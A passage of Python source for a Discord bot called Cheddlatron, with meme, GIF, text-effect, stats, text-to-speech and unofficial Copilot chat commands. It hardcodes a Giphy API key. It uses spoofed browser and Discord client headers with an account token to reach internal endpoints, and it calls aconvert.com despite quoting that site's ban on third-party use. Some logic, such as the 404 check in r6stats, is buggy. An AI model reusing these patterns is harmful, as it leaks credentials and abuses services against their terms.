        'a': 'ᥪಣಱᧀ',
        'b': 'ᣠಣಱᢩಣಱ',
        'c': 'ᛥᛝ',
        'd': 'ಉಣಱ',
        'e': 'ᚰಣಱᚸಣಱᚹ',
        'f': 'ᒴᒰ',
        'g': 'ϖ',
        'h': 'ლಣಱქ',
        'i': 'ᔑΩᔑ',
        'j': 'ΩᔑΩ',
        'k': 'ၸၴ',
        'l': 'ၡ',
        'm': 'ႁၡ',
        'n': 'ႰႤ',
        'o': 'ჰწჯ',
        'p': 'ᛠᛩ',
        'q': 'ᛠߐᢂᢂᢂᢂ',
        'r': 'ᛤᛟᛮ',
        's': 'ᖸᗱ',
        't': '⏇⏅⏆',
        'u': 'ϧ⏁⏇',
        'v': '⏂⏁',
        'w': '₶⊡',
        'x': 'ᾣ‿',
        'y': 'ᢆᢂ',
        'z': 'ᣆᣂ',
        '1': '⏂',
        '2': 'ᣆ',
        '3': 'ᢂᢂᢂᢂᢂᢂ',
        '4': '⏅ᢂᢂᢂᢂᢂ',
        '5': 'ᗱᗱEᗱ',
        '6': 'ᢆᗱ⏅',
        '7': 'ϧ⏅ლᗱ',
        '8': '⊡⊡⊡⊡⏅⏅ლ',
        '9': '⏇⏇ߐ',
        '0': 'ႁoႁ',
        ',': 'ϖ⊡',
        '!': 'ၸၴ⊡',
        '.': 'ჯწ',
        '?': 'წ⏇',
        '-': '⏇ϧ⏅',
        '#': '⊡⏅ლ',
        '@': 'ᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂᢂ',
        '*': '42',
        '"': '⏅ლၸၴ⊡ᢂᢂ',
        "'": "ၸၴᢂᢂᢂ"
        }
    text += ' '
    decipher = ''
    cipher = ''
    for letter in text:
        if letter != ' ':
            i = 0
            cipher += letter
        else:
            i += 1
            if i == 2:
                decipher += ' '
            else:
                decipher += list(to_morse.keys())[list(to_morse.values()).index(cipher)]
                cipher = ''
    await ctx.send(f"{decipher}")

@Cheddlatron.command(description=f"Animates text. \nUsage: {config_get('prefix')}animate <text>", help="fun")
async def animate(ctx, *, text):        
        output = ""
        text = list(text)
        msg = await ctx.send(text[0])
        for letter in text:
            output = output + letter + ""
            await msg.edit(content=output)
            await asyncio.sleep(0.5)

@Cheddlatron.command(description=f"Animates text. \nUsage: {config_get('prefix')}animate <text>", help="fun")
async def emojify(ctx, *, text):        
        text = text.lower()
        regional_indicators = {
        'a': '<:regional_indicator_a:803940414524620800>',
        'b': '<:regional_indicator_b:803940414524620800>',
        'c': '<:regional_indicator_c:803940414524620800>',
        'd': '<:regional_indicator_d:803940414524620800>',
        'e': '<:regional_indicator_e:803940414524620800>',
        'f': '<:regional_indicator_f:803940414524620800>',
        'g': '<:regional_indicator_g:803940414524620800>',
        'h': '<:regional_indicator_h:803940414524620800>',
        'i': '<:regional_indicator_i:803940414524620800>',
        'j': '<:regional_indicator_j:803940414524620800>',
        'k': '<:regional_indicator_k:803940414524620800>',
        'l': '<:regional_indicator_l:803940414524620800>',
        'm': '<:regional_indicator_m:803940414524620800>',
        'n': '<:regional_indicator_n:803940414524620800>',
        'o': '<:regional_indicator_o:803940414524620800>',
        'p': '<:regional_indicator_p:803940414524620800>',
        'q': '<:regional_indicator_q:803940414524620800>',
        'r': '<:regional_indicator_r:803940414524620800>',
        's': '<:regional_indicator_s:803940414524620800>',
        't': '<:regional_indicator_t:803940414524620800>',
        'u': '<:regional_indicator_u:803940414524620800>',
        'v': '<:regional_indicator_v:803940414524620800>',
        'w': '<:regional_indicator_w:803940414524620800>',
        'x': '<:regional_indicator_x:803940414524620800>',
        'y': '<:regional_indicator_y:803940414524620800>',
        'z': '<:regional_indicator_z:803940414524620800>'
        }
        output = ""
        text = list(text)
        for letter in text:
            if letter in regional_indicators:
                output = output + regional_indicators[letter] + " "
            else:
                output = output + letter
        await ctx.send(output)

@Cheddlatron.command(description=f"Turns text into zalgo. \nUsage: {config_get('prefix')}zalgo <text>", help="fun")
async def zalgo(ctx, *, text):       
        text = text.lower()
        regional_indicators = {
        'a': 'ą̸͖͈̟̗͉̪̠̎̀̓͘',
        'b': 'b̵̨̩͍͇̻̪̖̟̭͒͊',
        'c': 'ç̴̧̻̩͎̳̮̼̪̥̠̬̀̎́',
        'd': 'ḑ̸̛̱̥̯͔̻̮̘͎̱̻͙͇͕̉̈͂̐͑͗̓̉̄͌̑̉͂',
        'e': 'ë̵̩͇̪̪̣́̒',
        'f': 'f̴̥̗̲̻̭̩̲̬̦̖͖̏͂̆͋̾̕͠',
        'g': 'g̶͂̍̈̒̍̔͌͛̅͠ͅ',
        'h': 'h̵̤͊̌̇̉̈́̎̔͑̈͘',
        'i': 'i̶̧̢̼̭̱̼̪̪͈͔͙͓͈̰͔̋̏',
        'j': 'j̸̛̫̠̞̦̳̬̼̲͐̄̓͂̈́̐̆͊̑̕̚͜ͅ',
        'k': 'k̶̢̧͎͖̗͙̳̞͎̣͖̬͚̀̈́̍̌̓̿̈́̍͆͗',
        'l': 'l̴̛̫͎͊̿̌͜',
        'm': 'ḿ̴̩͉̫̫̉̏̏̉',
        'n': 'n̵̗̖̳̝̳̯̳͋̐̄̆͌̓̀̇̿̌͌̒̕̕͠',
        'o': 'o̵̡̢̦̘̜͍͛',
        'p': 'p̴̹̺͔͎̖̥͊̂̈́̉',
        'q': 'q̶̢͚͕̥̱̹̙̿̎̉̓̊',
        'r': 'r̶̺̥̀̃',
        's': 's̶͖̀́̆',
        't': 't̵̖̪͔̠̃͑̉',
        'u': 'u̴͔̟͌̈́̈́̈́̚͠',
        'v': 'v̵͉̂̚',
        'w': 'ẃ̷̛͚̭͍̺̖̈́',
        'x': 'x̸͍͌̌͜͜',
        'y': 'y̶̨͓͈̔̎̋',
        'z': 'z̸̨̹̜̅̿̌̈͘͜͜'
        }
        output = ""
        text = list(text)
        for letter in text:
            if letter in regional_indicators:
                output = output + regional_indicators[letter] + " "
            else:
                output = output + letter
        await ctx.send(output)

@Cheddlatron.command(description=f"Searches for a gif. \nUsage: {config_get('prefix')}gif <query>", help="fun")
async def gif(ctx, query=None):   
    if query is None:
        r = requesters.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])
    else:
        r = requesters.get(f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R&q={query}")
        res = r.json()
        gif_data = res['data'][0]
        await ctx.send(gif_data['url'])

@Cheddlatron.command(description=f"Counts up to a specified number. \nUsage: {config_get('prefix')}countto [number]", help="fun")
async def countto(ctx, number: int=10):    
    for count in range(number):
        await ctx.send(count)
        time.sleep(2)

@Cheddlatron.command(description=f"Sends horseplinko. \nUsage: {config_get('prefix')}horseplinko", help="fun")
async def horseplinko(ctx):    
    await ctx.send("https://Cheddlatron.eintim.me/content/cdn/EbCsJrPLDBdV.gif")
    await ctx.send("https://Cheddlatron.eintim.me/content/cdn/vUYtfSGaVkIY.gif")
    await ctx.send("https://Cheddlatron.eintim.me/content/cdn/hOrCbSsqYVAJ.gif")

@Cheddlatron.command(description=f"Puts wasted screen of a user's pfp. \nUsage: {config_get('prefix')}wasted <@user>", help="fun")
async def wasted(ctx, user: discord.User=None):    
    if user is None:
        user = ctx.message.author 
    url = f'https://some-random-api.com/canvas/wasted?avatar={user.avatar.replace(format="png", size=1024)}'
    await apiimg(ctx, url)


@Cheddlatron.command(description=f"Puts jail bars over a user's pfp. \nUsage: {config_get('prefix')}jail <@user>", help="fun")
async def jail(ctx, user: discord.User=None):   
    if user is None:
        user = ctx.message.author 
    url = f'https://some-random-api.com/canvas/overlay/jail?avatar={user.avatar.replace(format="png", size=1024)}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Turns a user's pfp into a triggered gif. \nUsage: {config_get('prefix')}triggered <@user>", help="fun")
async def triggered(ctx, user: discord.User=None):    
    if user is None:
        user = ctx.message.author 
    url = f'https://some-random-api.com/canvas/triggered?avatar={user.avatar.replace(format="png", size=1024)}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Puts USSR flag on a user's pfp. \nUsage: {config_get('prefix')}ussr <@user>", help="fun")
async def ussr(ctx, user: discord.User=None):   
    if user is None:
        user = ctx.message.author 
    url = f'https://some-random-api.com/canvas/comrade?avatar={user.avatar.replace(format="png", size=1024)}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Overlays missionpassed meme on someone's pfp. \nUsage: {config_get('prefix')}missionpassed <@user>", help="fun")
async def missionpassed(ctx, user: discord.User=None):    
    if user is None:
        user = ctx.message.author 
    url = f'https://some-random-api.com/canvas/passed?avatar={user.avatar.replace(format="png", size=1024)}'
    await apiimg(ctx, url)


@Cheddlatron.command(description=f"Pixelates a user's pfp. \nUsage: {config_get('prefix')}pixelate <@user>", help="fun")
async def pixelate(ctx, user: discord.User=None):   
    if user is None:
        user = ctx.message.author 
    url = f'https://some-random-api.com/canvas/pixelate?avatar={user.avatar.replace(format="png", size=1024)}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Blurs a person's pfp. \nUsage: {config_get('prefix')}blur <@user>", help="fun")
async def blur(ctx, user: discord.User=None):    
    if user is None:
        user = ctx.message.author 
    url = f'https://some-random-api.com/canvas/blur?avatar={user.avatar.replace(format="png", size=1024)}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Sends a custom YT comment. \nUsage: {config_get('prefix')}ytcomment <@use>r <text>", help="fun")
async def ytcomment(ctx, avatar: discord.Member, *, comment: str):    
    url = f'https://some-random-api.com/canvas/youtube-comment?avatar={avatar.avatar.replace(format="png", size=1024)}&comment={comment}&username={avatar}'
    await apiimg(ctx, url)

@Cheddlatron.command(description=f"Sends a tickle gif. \nUsage: {config_get('prefix')}tickle <@user>", help="fun")
async def tickle(ctx, user: discord.Member):   
    r = requesters.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    await ctx.send(user.mention + f" {res['url']}")

@Cheddlatron.command(description=f"Sends a slapping gif. \nUsage: {config_get('prefix')}slap <@user>", help="fun")
async def slap(ctx, user: discord.Member): 
    r = requesters.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    await ctx.send(user.mention + f" {res['url']}")

@Cheddlatron.command(description=f"Sends a hugging gif. \nUsage: {config_get('prefix')}hug <@user>", help="fun")
async def hug(ctx, user: discord.Member):    
    r = requesters.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    await ctx.send(user.mention + f" {res['url']}")

@Cheddlatron.command(description=f"Sends a smug gif. \nUsage: {config_get('prefix')}smug <@user>", help="fun")
async def smug(ctx, user: discord.Member):     
    r = requesters.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    await ctx.send(user.mention + f" {res['url']}")

@Cheddlatron.command(description=f"Sends a pat gif. \nUsage: {config_get('prefix')}pat <@user>", help="fun")
async def pat(ctx, user: discord.Member):    
    r = requesters.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    await ctx.send(user.mention + f" {res['url']}")

@Cheddlatron.command(description=f"Sends a kissing gif. \nUsage: {config_get('prefix')}kiss <@user>", help="fun")
async def kiss(ctx, user: discord.Member):    
    r = requesters.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    await ctx.send(user.mention + f" {res['url']}")

@Cheddlatron.command(description=f"Displays someone's Rainbow Six Siege stats. \nUsage: {config_get('prefix')}r6stats <r6 username>", help="fun")
async def r6stats(ctx, user):    
    r = requesters.get('https://r6.tracker.network/profile/pc/' + user)
    if r.status_code == 404:
        stats = r.text
        index1 = stats.find('PVPWLRatio')
        index1 += 13
        index2 = stats.find('<', index1) - 1
        winLoss = stats[index1:index2]
        index1 = stats.find('PVPKDRatio')
        index1 += 13
        index2 = stats.find('<', index1) - 1
        killDeath = stats[index1:index2]
        index1 = stats.find('PVPKills')
        index1 += 11
        index2 = stats.find('<', index1) - 1
        kills = stats[index1:index2]
        index1 = stats.find('PVPMatchesWon')
        index1 += 16
        index2 = stats.find('<', index1) - 1
        wins = stats[index1:index2]
        index1 = stats.find('PVPMatchesLost')
        index1 += 17
        index2 = stats.find('<', index1) - 1
        loss = stats[index1:index2]
        index1 = stats.find('PVPAccuracy')
        index1 += 14
        index2 = stats.find('<', index1) - 1
        headShotPercent = stats[index1:index2]
        index1 = stats.find('PVPTimePlayed')
        index1 += 16
        index2 = stats.find('<', index1) - 1
        playtime = stats[index1:index2]
        index1 = stats.find('PVPMatchesPlayed')
        index1 += 19
        index2 = stats.find('<', index1) - 1
        playedmatch = stats[index1:index2]
        index1 = stats.find('PVPHeadshots')
        index1 += 15
        index2 = stats.find('<', index1) - 1
        heads = stats[index1:index2]
        heading = f"{user}'s R6 Stats"
        body = f"Win/Loss Ratio: {winLoss}\nKill/Death Ratio: {killDeath}\nHeadshots: {heads}\nHeadshot Accuracy: {headShotPercent}\nKills: {kills}\nWins: {wins}\nLosses: {loss}\nMatches Played: {playedmatch}\nPlayTime: {playtime}"
        cmdname = "r6stats"
        await panelmaker(ctx, heading, body, cmdname)
    else:
        heading = "R6 Stats"
        body = f"Could not find {user}'s R6 Stats"
        cmdname = "r6stats"
        await panelmaker(ctx, heading, body, cmdname)

@Cheddlatron.command(description=f"Converts given text into a Text To Speech message. \nUsage: {config_get('prefix')}tts <text>", help="fun")
async def tts(ctx, *, message):
    async def convtoopus(file):
        json_data = {
            'targetformat': 'opus',
            'audiobitratetype': '0',
            'customaudiobitrate': '',
            'audiosamplingtype': '0',
            'customaudiosampling': '',
            'code': '82000',
            'oAuthToken': '',
            'legal': 'Our PHP programs can only be used in aconvert.com. We DO NOT allow using our PHP programs in any third-party websites, software or apps. We will report abuse to your cloud provider, Google Play and App store if illegal usage found!'
        }

        files=[
        ('file',('4883.MP4',file,'application/octet-stream'))
        ]

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Origin': 'https://www.aconvert.com',
            'Referer': 'https://www.aconvert.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="129", "Not=A?Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        }
        e = requested.post("https://s31.aconvert.com/convert/convert9.php", data=json_data, headers=headers, files=files).json()
        server = e['server']
        filename = e['filename']
        opus = requested.get(f"https://s{server}.aconvert.com/convert/p3r68-cdx67/{filename}")
        return opus.content
    
    async def do_tts(message):
        f = io.BytesIO()
        tts = gTTS(text=message.lower(), lang="en")
        tts.write_to_fp(f)
        f.seek(0)
        return f.getvalue()

    voicefile = await do_tts(message)
    voicefile = await convtoopus(voicefile)

    headers = {
        'Authorization': config_get('token'),
        'X-Super-Properties': getxsuper(),
    }

    payload  = {"files":[{"filename":"voice-message.ogg","file_size":1,"id":"69","is_clip":False}]}

    upload = requesters.post(f"https://discord.com/api/v9/channels/{ctx.channel.id}/attachments", headers=headers, json_data=payload).json()
    uploadname = upload['attachments'][0]["upload_filename"]
    uploadurl = upload['attachments'][0]["upload_url"]

    upload_headers = {
            "Host": "discord-attachments-uploads-prd.storage.googleapis.com",
            "Accept-Language": "en-NZ,en-AU;q=0.9,en;q=0.8",
            "User-Agent": "Discord/42954 CFNetwork/1390 Darwin/22.0.0",
            "Content-Type": "audio/ogg",
            "Connection": "keep-alive",
            "Content-Length": str(1)
    }
        
    upload_response = requested.put(uploadurl, data=voicefile, headers=upload_headers)

    payload = {"channel_id": str(ctx.channel.id), "flags": 8192, "content": "", "nonce": "", "type": 0, "attachments": [{"id": "69", "filename": "voice-message.ogg", "duration_secs": 0, "uploaded_filename": uploadname, "waveform": ""}]}
    requested.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages', headers=headers, json=payload)

@Cheddlatron.command(description=f"Sends a petpet meme of someone's pfp. \nUsage: {config_get('prefix')}petpet <@user>", help="fun")
async def petpet(ctx, image: discord.user.User):    
    type(image) == discord.user.User
    image = await image.avatar.replace(format='png').read()
    source = BytesIO(image)
    dest = BytesIO()
    petpetgif.make(source, dest)
    dest.seek(0)
    await ctx.send(file=discord.File(dest, filename=f"{image[0]}_Cheddlatron_petpet.gif"))

@Cheddlatron.command(description=f"Makes someone's pfp ripple. \nUsage: {config_get('prefix')}ripplepfp <@user>", help="fun")
async def ripplepfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="radiate", file_extension="gif")

@Cheddlatron.command(description=f"Flips a user's pfp. \nUsage: {config_get('prefix')}flippingpfp <@user>", help="fun")
async def flippingpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="shear", file_extension="gif")

@Cheddlatron.command(description=f"Makes a user into an Elmo burn meme. \nUsage: {config_get('prefix')}elmoburn <@user>", help="fun")
async def elmoburn(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="burn", file_extension="gif")

@Cheddlatron.command(description=f"Makes a user's pfp have a shock. \nUsage: {config_get('prefix')}shockpfp <@user>", help="fun")
async def shockpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="shock", file_extension="gif")

@Cheddlatron.command(description=f"Bonks a user's pfp. \nUsage: {config_get('prefix')}bonkpfp <@user>", help="fun")
async def bonkpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="bonks", file_extension="gif")

@Cheddlatron.command(description=f"Makes a user's pfp explicit. \nUsage: {config_get('prefix')}explicitpfp <@user>", help="fun")
async def explicitpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="explicit", file_extension="gif")

@Cheddlatron.command(description=f"Flickers a user's pfp. \nUsage: {config_get('prefix')}flickerpfp <@user>", help="fun")
async def flickerpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="lamp", file_extension="gif")

@Cheddlatron.command(description=f"Makes a user's pfp rainy. \nUsage: {config_get('prefix')}rainypfp <@user>", help="fun")
async def rainypfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="rain", file_extension="gif")

@Cheddlatron.command(description=f"Shoots a user's pfp. \nUsage: {config_get('prefix')}shootpfp <@user>", help="fun")
async def shootpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="shoot", file_extension="gif")

@Cheddlatron.command(description=f"Puts a user's pfp on TV. \nUsage: {config_get('prefix')}tvpfp <@user>", help="fun")
async def tvpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="tv", file_extension="gif")

@Cheddlatron.command(description=f"Puts a user's pfp through a printer. \nUsage: {config_get('prefix')}printerpfp <@user>", help="fun")
async def printerpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="print", file_extension="gif")

@Cheddlatron.command(description=f"Puts a user's pfp into the matrix. \nUsage: {config_get('prefix')}matrixpfp <@user>", help="fun")
async def matrixpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="matrix", file_extension="gif")

@Cheddlatron.command(description=f"Puts a user's pfp into a sensitive warning. \nUsage: {config_get('prefix')}sensitivepfp <@user>", help="fun")
async def sensitivepfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="sensitive", file_extension="gif")

@Cheddlatron.command(description=f"Dilates a user's pfp. \nUsage: {config_get('prefix')}dilatepfp <@user>", help="fun")
async def dilatepfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="dilate", file_extension="gif")

@Cheddlatron.command(description=f"Puts a user's pfp into a logging off meme. \nUsage: {config_get('prefix')}loggingoff <@user>", help="fun")
async def loggingoff(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="logoff", file_extension="gif")

@Cheddlatron.command(description=f"Puts a user's pfp into an endless picture. \nUsage: {config_get('prefix')}endlesspfp <@user>", help="fun")
async def endlesspfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="endless", file_extension="gif")

@Cheddlatron.command(description=f"Puts a user's pfp into a washing machine. \nUsage: {config_get('prefix')}washingmachine <@user>", help="fun")
async def washingmachine(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="laundry", file_extension="gif")

@Cheddlatron.command(description=f"Rips a user's pfp. \nUsage: {config_get('prefix')}rippedpfp <@user>", help="fun")
async def rippedpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="ripped", file_extension="gif")

@Cheddlatron.command(description=f"Rufies a user's pfp. \nUsage: {config_get('prefix')}rufiepfp <@user>", help="fun")
async def rufiepfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="stretch", file_extension="gif")

@Cheddlatron.command(description=f"Shreds a user's pfp. \nUsage: {config_get('prefix')}shredpfp <@user>", help="fun")
async def shredpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="shred", file_extension="gif")

@Cheddlatron.command(description=f"Liquefies a user's pfp. \nUsage: {config_get('prefix')}liquifypfp <@user>", help="fun")
async def liquifypfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="liquefy", file_extension="gif")

@Cheddlatron.command(description=f"Spins a user's pfp. \nUsage: {config_get('prefix')}spinpfp <@user>", help="fun")
async def spinpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="spin", file_extension="gif")

@Cheddlatron.command(description=f"Turns a user's pfp into plates. \nUsage: {config_get('prefix')}platepfp <@user>", help="fun")
async def platepfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="plate", file_extension="gif")

@Cheddlatron.command(description=f"Makes a user's pfp multicolored. \nUsage: {config_get('prefix')}rgbpfp <@user>", help="fun")
async def rgbpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="lsd", file_extension="gif")

@Cheddlatron.command(description=f"Paparazzi's a user's pfp. \nUsage: {config_get('prefix')}paparazzipfp <@user>", help="fun")
async def paparazzipfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="paparazzi", file_extension="gif")

@Cheddlatron.command(description=f"Big brains a user's pfp. \nUsage: {config_get('prefix')}bigbrainpfp <@user>", help="fun")
async def bigbrainpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="equations", file_extension="gif")

@Cheddlatron.command(description=f"Turns a user's pfp into an advert. \nUsage: {config_get('prefix')}adpfp <@user>", help="fun")
async def adpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="ads", file_extension="gif")

@Cheddlatron.command(description=f"Makes a user's pfp infinite. \nUsage: {config_get('prefix')}infinitepfp <@user>", help="fun")
async def infinitepfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="infinity", file_extension="gif")

@Cheddlatron.command(description=f"Makes a user's pfp flappy. \nUsage: {config_get('prefix')}flappypfp <@user>", help="fun")
async def flappypfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="ripple", file_extension="gif")

@Cheddlatron.command(description=f"Makes a user's pfp into a brick wall. \nUsage: {config_get('prefix')}brickpfp <@user>", help="fun")
async def brickpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="wall", file_extension="gif")

@Cheddlatron.command(description=f"Paints a user's pfp. \nUsage: {config_get('prefix')}paintpfp <@user>", help="fun")
async def paintpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="paint", file_extension="gif")

@Cheddlatron.command(aliases=['toilet'], description=f"Puts a user's pfp into a toilet. \nUsage: {config_get('prefix')}toiletpfp <@user>", help="fun")
async def toiletpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="flush", file_extension="gif")

@Cheddlatron.command(description=f"Makes someone's pfp canny. \nUsage: {config_get('prefix')}cannypfp <@user>", help="fun")
async def cannypfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="canny", file_extension="gif")

@Cheddlatron.command(description=f"Makes someone's pfp shakey. \nUsage: {config_get('prefix')}shakeypfp <@user>", help="fun")
async def shakeypfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="earthquake", file_extension="gif")

@Cheddlatron.command(description=f"Makes someone's pfp wiggly. \nUsage: {config_get('prefix')}wigglepfp <@user>", help="fun")
async def wigglepfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="boil", file_extension="gif")

@Cheddlatron.command(description=f"Glitches out someone's pfp. \nUsage: {config_get('prefix')}glitchpfp <@user>", help="fun")
async def glitchpfp(ctx, user: discord.User=None):
    if user is None:
        user = ctx.message.author
    await jeyyapi(ctx, user=user, endpointer="glitch", file_extension="gif")



async def establish_websocket(accesstoken):
    uri = "wss://sydney.bing.com/sydney/ChatHub?sec_access_token=" + urllib.parse.quote(accesstoken)
    ws = await connect(uri)
    await ws.send('{"protocol":"json","version":1}\x1e')
    return ws

async def send_query(ws, query, conversationId, clientId):
    now = datetime.now().astimezone(timezone(timedelta(hours=1)))
    timestamp = now.strftime("%Y-%m-%dT%H:%M:%S%z")
    timestamp = timestamp[:-2] + ':' + timestamp[-2:]
    j2 = {"arguments":[{"source":"cib","optionsSets":["nlu_direct_response_filter","deepleo","disable_emoji_spoken_text","responsible_ai_policy_235","enablemm","dv3sugg","iyxapbing","iycapbing","h3precise","clgalileo","gencontentv3","storagev2fork","papynoapi","gndlogcf","gptvnoex"],"allowedMessageTypes":["ActionRequest","Chat","ConfirmationCard","Context","InternalSearchQuery","InternalSearchResult","Disengaged","InternalLoaderMessage","Progress","RenderCardRequest","RenderContentRequest","AdsQuery","SemanticSerp","GenerateContentQuery","SearchQuery","GeneratedCode"],"sliceIds":["bgstreamcf","designer2cf","suppsm240hm","srchqryfix","suppsm240-t","cmcpupsalltf","sydtransctrl","proupsallcf","0209bicv3","130memrev","116langwbs0","927storev2fk","0208papynoa","sapsgrds0","1119backoss0","enter4nl"],"verbosity":"verbose","scenario":"SERP","plugins":[],"conversationHistoryOptionsSets":["autosave","savemem","uprofupd","uprofgen"],"isStartOfSession":True,"message":{"locale":"en-GB","timestamp":timestamp,"author":"user","inputMethod":"Keyboard","text":query,"messageType":"Chat"},"tone":"Precise","spokenTextMode":"None","conversationId":conversationId,"participant":{"id":clientId}}],"invocationId":"0","target":"chat","type":4}
    await ws.send(json.dumps(j2) + "\x1e")

async def queryCopilot(query, ws, conversationId, clientId):
    try:
        await send_query(ws, query, conversationId, clientId)
        
        while True:
            message = await ws.recv()
            data = message.split("\x1e")

            for cleandata in data:
                if cleandata == "":
                    continue

                j = json.loads(cleandata)

                if cleandata == "{}":
                    await ws.send('{"type":6}\x1e')
                    await send_query(ws, query, conversationId, clientId)
                    continue

                if j["type"] == 2:
                    return j["item"]["result"]["message"]
    finally:
        await ws.close()

@Cheddlatron.command(aliases=['gpt4'], description=f"Talks to the GPT-4 AI. \nUsage: {config_get('prefix')}gpt <text>", help="fun")
async def gpt(ctx, *, query):
    session = requested.Session()

    headers = {
        'authority': 'copilot.microsoft.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'referer': 'https://copilot.microsoft.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'sec-ch-ua-arch': '"x86"',
        'sec-ch-ua-bitness': '"64"',
        'sec-ch-ua-full-version': '"120.0.6099.199"',
        'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.199"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-ms-client-request-id': '5e2ba668-a315-422e-8bc1-2b699da1b29f',
        'x-ms-useragent': 'azsdk-js-api-client-factory/1.0.0-beta.1 core-rest-pipeline/1.12.3 OS/Windows',
        }
    params = {
        'bundleVersion': '1.1573.4',
    }

